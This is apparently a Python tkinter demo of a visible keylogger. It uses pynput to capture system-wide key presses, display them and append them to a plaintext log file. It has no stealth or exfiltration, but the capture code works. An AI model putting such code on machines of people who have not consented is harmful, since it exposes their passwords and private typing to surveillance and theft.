import tkinter as tk
from tkinter import scrolledtext
from tkinter import font as tkFont
from pynput import keyboard


class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("400x350")
        self.root.configure(bg="#2C3E50")  # Dark background color
        
        # Create a custom font
        self.custom_font = tkFont.Font(family="Helvetica", size=12)

        # Title Label
        title_label = tk.Label(root, text="Keylogger Application", bg="#2C3E50", fg="#ECF0F1", font=tkFont.Font(size=16))
        title_label.pack(pady=10)

        # Create a scrolled text area for logging keys
        self.log_text = scrolledtext.ScrolledText(root, wrap='word', height=15, width=50, font=self.custom_font, bg="#34495E", fg="#ECF0F1", insertbackground='white')
        self.log_text.pack(pady=10)

        # Create Start and Stop buttons with custom styles
        self.start_button = tk.Button(root, text="Start Logging", command=self.start_logging, bg="#27AE60", fg="#FFFFFF", font=self.custom_font, width=15)
        self.start_button.pack(side='left', padx=20, pady=10)

        self.stop_button = tk.Button(root, text="Stop Logging", command=self.stop_logging, bg="#C0392B", fg="#FFFFFF", font=self.custom_font, width=15, state=tk.DISABLED)
        self.stop_button.pack(side='right', padx=20, pady=10)

        # Initialize listener
        self.listener = None

        # Log file path
        self.log_file = "keylogs.txt"

    def on_press(self, key):
        """Callback for when a key is pressed."""
        try:
            key_str = f'Key {key.char} pressed.\n'
        except AttributeError:
            key_str = f'Special key {key} pressed.\n'
        
        # Update the text area
        self.log_text.insert(tk.END, key_str)
        self.log_text.see(tk.END)  # Auto-scroll to the bottom

        # Save to log file
        with open(self.log_file, "a") as f:
            f.write(key_str)

    def on_release(self, key):
        """Callback for when a key is released."""
        if key == keyboard.Key.esc:
            return False  # Stop listener

    def start_logging(self):
        """Start the key logging."""
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        
        # Update button states
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_logging(self):
        """Stop the key logging."""
        if self.listener is not None:
            self.listener.stop()
            self.listener = None
            
            # Update button states
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
